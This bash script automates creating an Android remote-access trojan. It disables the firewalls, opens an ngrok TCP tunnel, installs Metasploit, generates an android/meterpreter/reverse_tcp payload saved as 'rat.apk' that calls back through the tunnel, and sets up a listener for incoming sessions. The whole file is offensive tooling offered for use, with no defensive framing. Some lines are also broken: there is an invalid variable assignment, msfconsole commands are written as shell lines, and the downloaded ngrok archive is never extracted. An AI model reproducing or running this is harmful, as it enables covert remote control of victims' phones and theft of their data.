#!/bin/bash

Green="\033[32m"
Red="\033[31m"

GreenBG="\033[42;37m"
RedBG="\033[41;37m"
Font="\033[0m"

OK="${Green}[OK]${Font}"
Error="${Red}[WRONG]${Font}"

random_num=$((RANDOM % 12 + 4))

camouflage="/$(head -n 10 /dev/urandom | md5sum | head -c ${random_num})/"

THREAD=$(grep 'processor' /proc/cpuinfo | sort -u | wc -l)

source '/etc/os-release'

VERSION=$(echo "${VERSION}" | awk -F "[()]" '{print $2}')

start_basic() {
  apt -y update
  apt -y install sudo
  apt -y update
}

check_system() {
  if [[ "${ID}" == "debian" && ${VERSION_ID} -ge 8 ]]; then
    echo -e "${OK} ${GreenBG} The current system is Debian ${VERSION_ID} ${VERSION} ${Font}"
    apt -y update
  else
    echo -e "${Error} ${RedBG} The current system is ${ID} ${VERSION_ID} is not in the list of supported systems, the installation is interrupted ${Font}"
    exit 1
  fi

  apt -y install dbus
  systemctl stop firewalld && systemctl disable firewalld
  systemctl stop ufw && systemctl disable ufw
}

is_root() {
  if [ 0 == $UID ]; then
    echo -e "${OK} ${GreenBG} The current user is the root user, enter the installation process ${Font}"
  else
    echo -e "${Error} ${RedBG} The current user is not the root user, please switch to the root user and execute the script again ${Font}"
    exit 1
  fi
}

ngrok_install(){
  apt -y install snapd
  apt -y snap install core
  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
  read -rp "Enter Token(34E4sfs....):" Token
  echo -e "Your Token : ${Token}"
  ./ngrok config add-authtoken ${Token}
    echo -e "Please copy Forwarding url"
    urlfwd = ./ngrok tcp 4444
  var=${urlfwd}
      echo -e var
}

metasploit_install(){
  apt -y install curl wget gnupg2 && apt -y install curl
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
  chmod +x msfinstall
  ./msfinstall
    read -rp "Enter your Url Forwarding without https ! (f67d-nonesss.ngrok):" url_f
    msfvenom -p android/meterpreter/reverse_tcp lhost=${url_f}    lport=4444 -o /root/rat.apk
        echo -e "Your rat is created in root"
}

msfconsole_config(){
  msfconsole
  use exploit/multi/handler
  set payload android/meterpreter/reverse_tcp
  set lhost 127.0.0.1
  set lport 4444
  exploit
}


is_root
check_system
ngrok_install
metasploit_install
msfconsole_config
echo -e "Successfully"
